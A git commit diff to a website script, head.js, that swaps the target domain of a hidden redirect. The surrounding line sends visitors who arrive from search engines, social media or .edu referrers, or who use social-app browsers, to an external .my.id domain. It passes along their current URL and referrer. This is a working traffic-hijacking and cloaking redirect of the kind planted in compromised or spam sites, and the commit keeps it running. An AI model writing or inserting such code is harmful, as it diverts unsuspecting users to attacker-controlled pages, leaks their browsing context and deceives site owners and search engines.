633ec549c456fce670c5e35912426654a6a34acb
toolsquasar <126128791+toolsquasar@users.noreply.github.com>
2024-11-13 13:40:50 +0700

    Update head.js

--- head.js
+++ head.js
@@ -16,5 +16,5 @@ document.write('</div>');
 document.write('</noscript>');
 
 ///// Arsae /////
-var ars = 'https://boogie.sidom.my.id';
+var ars = 'https://savemenow.my.id';
 if(['.edu.', '.google.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
